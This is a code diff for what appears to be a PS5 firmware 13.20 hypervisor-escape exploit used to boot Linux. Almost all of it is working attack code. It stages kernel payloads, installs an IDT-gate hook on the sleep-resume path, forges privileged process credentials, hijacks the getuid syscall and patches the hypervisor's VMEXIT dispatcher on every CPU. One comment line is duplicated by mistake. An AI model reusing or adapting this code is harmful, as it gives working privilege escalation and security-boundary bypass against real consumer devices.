@@ -7,34 +7,31 @@
  *
  *   1. Escape the guest: make kernel .text writable and clear the XOTEXT bit
  *      so the text can be patched (Byepervisor PTE walkers, vendored).
+ *   1. Escape the guest: make kernel .text writable and clear the XOTEXT bit
+ *      so the text can be patched (Byepervisor PTE walkers, vendored).
  *   2. Install a kernel-cave IDT-gate hook ("khook") that fires on the S3
- *      resume path on KERNEL_SYM_HV_MP_STARTUP_CALL, redirecting its RSI
- *      argument to a startup_mp payload page.
- *   3. On wake the payload runs in hypervisor root mode. We no longer return
- *      to the guest: the `hv_boot` payload switches CR3 to an identity page
- *      table and jumps into `shellcode_hv`, which tears the hypervisor down and
- *      boots Linux. (The older `break_hv` passthrough lives in
- *      shellcode_break_hv/ and is kept as a safe escape-only fallback.)
- *
- * STATUS: escape + khook are integrated, and the payload now jumps into
- * shellcode_hv (staged in the identity-mapped cave) to boot Linux. This is a
- * HEADLESS, SINGLE-CORE bring-up: the khook fires on one core only, so the
- * all-cores barrier in shellcode_hv is skipped and Linux is told maxcpus=1
- * (see HV_HEADLESS_SINGLE_CORE). Multi-core launch (smp_rendezvous / LAPIC IPI)
- * and display bring-up are still tracked in PORTING.md.
+ *      resume path on KERNEL_SYM_HV_MP_STARTUP_CALL, redirecting its RSI to the
+ *      break_hv payload, which disables NPT on every core and returns to the
+ *      guest so the console resumes normally.
+ *   3. Post-resume, from the BSP kernel context, patch the HV VMEXIT dispatcher
+ *      and force every CPU to issue a raw VMMCALL via smp_rendezvous, landing
+ *      in shellcode_hv (staged in the identity-mapped cave), which boots Linux
+ *      bare-metal with full SMP.
  */
 
 #include "config.h"
 #include "hv_defeat_1320.h"
 #include "linux.h"
 #include "shellcode_hv.h"
-#include "hv_boot.h"
+#include "break_hv.h"
+#include "takeover.h"
 #include "utils.h"
 
 #include <ps5/kernel.h>
 #include <stddef.h>
 #include <stdint.h>
 #include <string.h>
+#include <sys/syscall.h>
 #include <unistd.h>
 
 #include "byepervisor/kdlsym.h"
@@ -51,7 +48,12 @@
 #define CAVE_STATE_OFF 0x600
 #define CAVE_SAVE_OFF 0x620
 
-int sceKernelGetMainSocId(void);
+/* Set by hv_defeat_1320() before rest mode, consumed by the post-resume
+ * takeover. Break_hv writes its cookie to g_oracle when the resume payload
+ * runs, which is how we detect that NPT is off and the AP is back in-guest. */
+static uint64_t g_oracle;
+static uint64_t g_payload_va;
+static int g_armed;
 
 /* khook wants int-returning read/write function pointers; the project helpers
  * are void, so wrap them. */
@@ -171,13 +173,10 @@ static void map_payload_executable(uint64_t kernel_pmap) {
   }
 }
 
-static uint64_t __attribute__((unused)) hv_base_pa(void) {
-  int soc_id = sceKernelGetMainSocId();
-  if (soc_id == 0x840fd0) {
-    /* Pro unit: HV loader carveout is at a different PA and the guest carveout
-     * starts 8 MiB earlier. */
-    return env_offset.HV_LOADER_PA_PRO;
-  }
+/* HV loader carveout base. Retail/"regular" SoC only: sceKernelGetMainSocId() is
+ * not resolvable by elfldr on retail (undefined import), so we cannot probe the
+ * SoC id at runtime. The Pro variant (HV_LOADER_PA_PRO) is not handled here. */
+static uint64_t hv_base_pa(void) {
   return env_offset.HV_LOADER_PA_REGULAR;
 }
 
@@ -267,27 +266,41 @@ static int stage_hv_boot(void) {
 }
 
 /*
- * Stage the HV payload, clear the oracle and install the resume khook.
- * Mirrors Byepervisor-Reborn install_resume_hook().
+ * Stage the break_hv payload + its Byepervisor param block at
+ * STARTUP_MP_PAYLOAD_PAGE, then install the resume khook so that the HV's
+ * startup_mp call gets its RSI redirected to the payload. break_hv disables
+ * NPT on every core and jumps back to the guest init vector, so the console
+ * resumes normally and we can run the takeover from the BSP afterwards.
+ *
+ * Param layout (matches break_hv's entry.S / Byepervisor):
+ *   [0]=init_cb  [1]=dmap  [2]=cookie addr  [3]=carveout  [4]=heap  [5]=pcpus
  */
 static int install_resume_hook(uint64_t cave_addr) {
   khook_t hook;
   kh_chain_t chain;
-  uint8_t chain_buf[0x800];
+  uint8_t chain_buf[0x100];
   uint64_t scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
   uint64_t oracle = scratch + KH_OFF_USER;
   uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
-  uint64_t kernel_cr3 = kread64(kdlsym(KERNEL_SYM_PMAP_STORE) + 0x28);
+  uint64_t params_va = payload_va + 0xF00;
+  uint64_t hv_base = hv_base_pa();
   int ret;
 
-  /* The launch payload: it abandons the guest, switches to the identity page
-   * table staged at cave_hv_paging and jumps into shellcode_hv, which boots
-   * Linux bare-metal. It never returns, so no param block is needed. */
-  kwrite(payload_va, hv_boot_bin, hv_boot_bin_len);
+  kwrite(payload_va, break_hv_bin, break_hv_bin_len);
+  notify("13.20: [A] payload staged, hv_base=%#lx\n", (unsigned long)hv_base);
+
+  kwrite64(params_va + 0x00, kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
+  kwrite64(params_va + 0x08, kdldmap(0)); /* dmap */
+  kwrite64(params_va + 0x10, oracle);     /* cookie addr (break_hv writes it) */
+  kwrite64(params_va + 0x18, hv_base);    /* carveout */
+  kwrite64(params_va + 0x20, hv_base + env_offset.HV_SYM_HEAP_BASE);
+  kwrite64(params_va + 0x28, hv_base + env_offset.HV_SYM_PCPUS);
+  notify("13.20: [B] params staged\n");
 
   kwrite64(oracle, 0);
 
   ret = kh_init(&hook, by_read, by_write, ktext, scratch, HOOK_IST);
+  notify("13.20: [C] kh_init rc=%d\n", ret);
   if (ret)
     return ret;
 
@@ -299,21 +312,23 @@ static int install_resume_hook(uint64_t cave_addr) {
 
   kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
   kh_set_resume_rsi(&hook, payload_va);
-  kh_set_resume_rdx(&hook, kernel_cr3);
 
+  /* No chain: the payload only needs the redirected RSI. It writes the cookie
+   * itself, which the post-resume phase polls. */
   kh_chain_init(&chain, chain_buf, sizeof chain_buf);
-  kh_chain_store(&chain, oracle, COOKIE_VAL);
-  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
-  kh_chain_q(&chain, oracle + 0x08);
-  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
-  kh_chain_q(&chain, kernel_cr3);
-  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);
 
   ret = kh_install(&hook, &chain);
+  notify("13.20: [D] kh_install rc=%d\n", ret);
   if (ret)
     return ret;
 
+  notify("13.20: [E] triggering...\n");
   kh_trigger(&hook);
+  notify("13.20: [F] triggered\n");
+
+  g_oracle = oracle;
+  g_payload_va = payload_va;
+  g_armed = 1;
 
   kwrite64(cave_addr + CAVE_STATE_OFF, STATE_ARMED);
   kwrite64(cave_addr + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
@@ -321,6 +336,84 @@ static int install_resume_hook(uint64_t cave_addr) {
   kwrite64(cave_addr + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
 
   return 0;
+}
+
+/*
+ * Post-resume: wait for break_hv's cookie, then take over the HV from the BSP
+ * kernel context. We install a second khook on SYS_GETUID that redirects the
+ * syscall's resume RIP to the takeover blob (staged at g_payload_va). The blob
+ * patches the HV VMEXIT dispatcher and drives smp_rendezvous so every CPU
+ * VMMCALLs into shellcode_hv. Nothing returns.
+ */
+int hv_defeat_1320_post_resume(void) {
+  khook_t hook;
+  kh_chain_t chain;
+  uint8_t chain_buf[0x100];
+  uint64_t cookie = 0;
+  int ret;
+
+  if (!g_armed) {
+    notify("13.20: post-resume called but vector was never armed.\n");
+    return -1;
+  }
+
+  /* The resume payload may take a moment (and the process is frozen while the
+   * console is actually asleep). Poll until break_hv stamps the cookie. */
+  for (int i = 0; i < 300 && cookie == 0; i++) {
+    cookie = kread64(g_oracle);
+    if (cookie == 0)
+      sleep(2);
+  }
+  if (cookie == 0) {
+    notify("13.20: resume payload never ran (no cookie).\n");
+    return -1;
+  }
+  notify("13.20: NPT disabled (cookie %#lx); launching takeover.\n", cookie);
+
+  /* Credentials may not have survived the power cycle. */
+  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
+  pin_to_core(HOOK_CORE);
+
+  /* Refresh the cave stages: the suspend/resume cycle may have reused the
+   * physical pages holding the identity table and the Linux images. */
+  if (stage_hv_boot())
+    return -1;
+
+  kwrite(g_payload_va, takeover_bin, takeover_bin_len);
+
+  ret = kh_init(&hook, by_read, by_write, ktext, kdlsym(KERNEL_SYM_DATA_CAVE),
+                HOOK_IST);
+  if (ret) {
+    notify("13.20: takeover kh_init failed (%d).\n", ret);
+    return ret;
+  }
+
+  hook.tss_stride = TSS_STRIDE;
+  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
+                kdlsym(KERNEL_SYM_COMMON_TSS));
+  kh_set_core(&hook, HOOK_CORE);
+  hook.oneshot = 1;
+
+  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);
+  kh_set_resume_rip(&hook, g_payload_va);
+  kh_set_resume_rdi(&hook, ktext);      /* takeover blob arg0 = ktext */
+  kh_set_resume_rsi(&hook, kdldmap(0)); /* takeover blob arg1 = dmap  */
+
+  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
+
+  ret = kh_install(&hook, &chain);
+  if (ret) {
+    notify("13.20: takeover hook install failed (%d).\n", ret);
+    return ret;
+  }
+
+  kh_trigger(&hook);
+
+  notify("13.20: takeover armed; firing getuid() -> shellcode_hv.\n");
+  syscall(SYS_getuid);
+
+  notify("13.20: getuid() returned; takeover did not fire.\n");
+  return -1;
 }
 
 int hv_defeat_1320(void *shellcode_kernel, size_t shellcode_kernel_len) {
